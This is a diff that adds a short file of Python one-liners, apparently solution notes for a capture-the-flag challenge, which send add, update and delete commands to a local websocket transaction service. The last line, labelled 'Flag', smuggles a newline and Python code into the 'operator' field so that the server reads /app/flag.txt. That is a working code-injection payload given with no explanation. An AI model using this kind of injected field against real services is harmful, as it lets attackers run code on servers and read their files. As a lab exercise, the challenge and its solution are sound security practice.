@@ -1,0 +1,8 @@
+Add
+python -c "import json, websocket; ws = websocket.create_connection('ws://localhost:8000/websocket'); ws.send(json.dumps({'command': 'add', 'transaction': {'id': 1, 'amount': 10}}).encode()); print(ws.recv()); ws.close()"
+Update
+python -c "import json, websocket; ws = websocket.create_connection('ws://localhost:8889/websocket'); ws.send(json.dumps({'command': 'update', 'id': 2, 'operator': '+', 'amount': 5}).encode()); print(ws.recv()); ws.close()"
+Delete
+python -c "import json, websocket; ws = websocket.create_connection('ws://localhost:8889/websocket'); ws.send(json.dumps({'command': 'delete', 'id': 1}).encode()); print(ws.recv()); ws.close()"
+Flag
+python -c "import json, websocket; ws = websocket.create_connection('ws://localhost:8889/websocket'); ws.send(json.dumps({'command': 'update', 'id': 1, 'operator': '\nresult = open(\"/app/flag.txt\", \"r\").readlines() #', 'amount': 5}).encode()); print(ws.recv()); ws.close()"
